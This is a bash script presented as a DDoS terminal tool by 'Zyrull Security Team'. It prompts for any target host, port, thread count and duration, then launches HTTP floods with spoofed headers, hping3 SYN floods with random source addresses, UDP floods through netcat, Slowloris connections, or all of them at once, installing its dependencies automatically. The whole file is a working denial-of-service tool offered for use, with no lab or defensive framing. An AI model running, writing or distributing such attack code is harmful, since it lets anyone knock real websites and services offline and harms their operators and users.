#!/bin/bash

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Logo Besar Zyrull
show_logo() {
    echo -e "${RED}"
    echo "   ███████╗██╗   ██╗██████╗ ██╗   ██╗██╗     ██╗"
    echo "   ╚══███╔╝╚██╗ ██╔╝██╔══██╗╚██╗ ██╔╝██║     ██║"
    echo "     ███╔╝  ╚████╔╝ ██████╔╝ ╚████╔╝ ██║     ██║"
    echo "    ███╔╝    ╚██╔╝  ██╔══██╗  ╚██╔╝  ██║     ██║"
    echo -e "   ███████╗   ██║   ██║  ██║   ██║   ███████╗███████╗${NC}"
    echo -e "${CYAN}"
    echo "   ███████╗██╗   ██╗██████╗ ██╗   ██╗██╗     ██╗"
    echo "   ██╔════╝╚██╗ ██╔╝██╔══██╗╚██╗ ██╔╝██║     ██║"
    echo "   █████╗   ╚████╔╝ ██████╔╝ ╚████╔╝ ██║     ██║"
    echo "   ██╔══╝    ╚██╔╝  ██╔══██╗  ╚██╔╝  ██║     ██║"
    echo -e "   ██║        ██║   ██║  ██║   ██║   ███████╗███████╗${NC}"
    echo -e "${YELLOW}   ╚═╝        ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝${NC}"
    echo -e "${PURPLE}                   DDOS TERMINAL v4.0 - FULL FEATURE${NC}"
    echo -e "${GREEN}                  Author: Zyrull Security Team${NC}"
    echo ""
}

# Method attack
attack_http() {
    target=$1
    port=$2
    threads=$3
    duration=$4
    
    end=$((SECONDS + duration))
    
    for ((i=1; i<=threads; i++)); do
        (
            while [ $SECONDS -lt $end ]; do
                curl -s -X GET "http://$target:$port" \
                    -H "User-Agent: Zyrull-DDoS/4.0" \
                    -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM" \
                    --connect-timeout 1 \
                    --max-time 2 > /dev/null 2>&1 &
                
                curl -s -X POST "http://$target:$port" \
                    -d "data=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 1024 | head -n 1)" \
                    -H "Content-Type: application/x-www-form-urlencoded" \
                    --connect-timeout 1 \
                    --max-time 2 > /dev/null 2>&1 &
            done
        ) &
    done
}

attack_syn() {
    target=$1
    port=$2
    threads=$3
    duration=$4
    
    end=$((SECONDS + duration))
    
    for ((i=1; i<=threads; i++)); do
        (
            while [ $SECONDS -lt $end ]; do
                hping3 -S -p $port --flood --rand-source $target 2>/dev/null &
                timeout 1 nc -nvz $target $port 2>/dev/null &
            done
        ) &
    done
}

attack_udp() {
    target=$1
    port=$2
    threads=$3
    duration=$4
    
    end=$((SECONDS + duration))
    
    for ((i=1; i<=threads; i++)); do
        (
            while [ $SECONDS -lt $end ]; do
                dd if=/dev/urandom bs=1024 count=100 2>/dev/null | nc -u $target $port &
            done
        ) &
    done
}

attack_slowloris() {
    target=$1
    port=$2
    threads=$3
    duration=$4
    
    end=$((SECONDS + duration))
    
    for ((i=1; i<=threads; i++)); do
        (
            exec 3<>/dev/tcp/$target/$port
            echo -e "GET / HTTP/1.1\r\nHost: $target\r\nUser-Agent: Zyrull\r\n" >&3
            while [ $SECONDS -lt $end ]; do
                echo -e "X-Header-$RANDOM: $RANDOM\r\n" >&3
                sleep 5
            done
        ) &
    done
}

# Main menu
main_menu() {
    clear
    show_logo
    
    echo -e "${CYAN}[01] HTTP Flood Attack${NC}"
    echo -e "${CYAN}[02] SYN Flood Attack${NC}"
    echo -e "${CYAN}[03] UDP Flood Attack${NC}"
    echo -e "${CYAN}[04] Slowloris Attack${NC}"
    echo -e "${CYAN}[05] Mixed Mode (All Attacks)${NC}"
    echo -e "${RED}[00] Exit${NC}"
    echo ""
    echo -ne "${YELLOW}Select Attack Mode: ${NC}"
    read mode
    
    case $mode in
        1) method="http" ;;
        2) method="syn" ;;
        3) method="udp" ;;
        4) method="slowloris" ;;
        5) method="mixed" ;;
        0) exit 0 ;;
        *) echo -e "${RED}Invalid!"; sleep 2; main_menu ;;
    esac
    
    echo -ne "${YELLOW}Target IP/Domain: ${NC}"
    read target
    echo -ne "${YELLOW}Port: ${NC}"
    read port
    echo -ne "${YELLOW}Threads (1-1000): ${NC}"
    read threads
    echo -ne "${YELLOW}Duration (seconds): ${NC}"
    read duration
    
    echo -e "${GREEN}[+] Starting Attack on $target:$port${NC}"
    echo -e "${GREEN}[+] Mode: $method | Threads: $threads | Duration: ${duration}s${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop${NC}"
    echo ""
    
    SECONDS=0
    
    case $method in
        "http")
            attack_http $target $port $threads $duration
            ;;
        "syn")
            attack_syn $target $port $threads $duration
            ;;
        "udp")
            attack_udp $target $port $threads $duration
            ;;
        "slowloris")
            attack_slowloris $target $port $threads $duration
            ;;
        "mixed")
            attack_http $target $port $((threads/4)) $duration &
            attack_syn $target $port $((threads/4)) $duration &
            attack_udp $target $port $((threads/4)) $duration &
            attack_slowloris $target $port $((threads/4)) $duration &
            ;;
    esac
    
    # Monitor
    while [ $SECONDS -lt $duration ]; do
        echo -ne "\r${YELLOW}[*] Time elapsed: ${SECONDS}s / ${duration}s | Packets sent: $((SECONDS * threads * 100))${NC}   "
        sleep 1
    done
    
    echo -e "\n${GREEN}[+] Attack Finished!${NC}"
    sleep 3
    main_menu
}

# Check dependencies
check_deps() {
    deps=("curl" "nc" "hping3")
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${YELLOW}[!] Installing $dep...${NC}"
            apt-get update -qq && apt-get install -y $dep -qq 2>/dev/null
        fi
    done
}

# Run
check_deps
main_menu